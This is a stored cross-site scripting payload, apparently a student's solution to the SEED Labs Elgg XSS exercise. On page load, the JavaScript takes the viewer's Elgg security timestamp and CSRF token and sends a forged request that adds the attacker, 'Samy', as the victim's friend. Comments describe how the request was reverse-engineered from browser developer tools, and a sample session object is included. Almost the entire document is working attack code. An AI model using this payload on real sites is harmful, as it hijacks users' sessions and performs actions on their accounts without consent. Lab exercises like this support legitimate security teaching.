<script type="text/javascript">
    window.onload = function () {
	var Ajax=null;
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var token="&__elgg_token="+elgg.security.token.__elgg_token;
    //Construct the HTTP request to add Samy as a friend.

    var url1 = "http://www.xsslabelgg.com/action/friends/add?friend=";
    var userid = elgg.page_owner.guid;
    var sendurl = url1 + userid + ts + token + ts + token; //FILL IN

    // http://www.xsslabelgg.com/action/friends/add?friend=47
    //&__elgg_ts=1624213273&__elgg_token=3qiQClD2nrEaJRzoSOYKbg&__elgg_ts=1624213273
    //&__elgg_token=3qiQClD2nrEaJRzoSOYKbg

    // At first I sent a friend request normally,
    // then inspected the network section in browser's developer tools
    // then copied the request sent to server when sending friend request
    // then I made a request like that using javascript
    // I found a JSON object in source file of the html named elgg
    // I extracted user informations from that JSON object and made a string using that

    /* this is a sample JSON object

    var elgg =
    {
        "config":
    {"lastcache":1549469404,"viewtype":"default","simplecache_enabled":1},
    "security":
    {"token":{"__elgg_ts":1624213273,"__elgg_token":"3qiQClD2nrEaJRzoSOYKbg"}},
    "session":
    {"user":
    {"guid":44,"type":"user","subtype":"","owner_guid":44,"container_guid":0,"site_guid":1,"time_created":"2017-07-26T20:29:47+00:00","time_updated":"2021-06-20T18:13:37+00:00","url":"http:\/\/www.xsslabelgg.com\/profile\/alice","name":"Alice","username":"alice","language":"en","admin":false},
    "token":"V50Hua4Xxja_QWXPPCAVea"
	        },
    "_data":{ },
    "page_owner":
    {"guid":47,"type":"user","subtype":"","owner_guid":47,"container_guid":0,"site_guid":1,"time_created":"2017-07-26T20:30:59+00:00","time_updated":"2017-07-26T20:30:59+00:00","url":"http:\/\/www.xsslabelgg.com\/profile\/samy","name":"Samy","username":"samy","language":"en"}
    };

    */

    //Create and send Ajax request to add friend
    if(elgg.session.user.guid != elgg.page_owner.guid)
    {
        Ajax = new XMLHttpRequest();
    Ajax.open("GET",sendurl,true);
    //Ajax.setRequestHeader("Host","www.xsslabelgg.com");
    //Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
    Ajax.send();	
	}
	
	}
</script>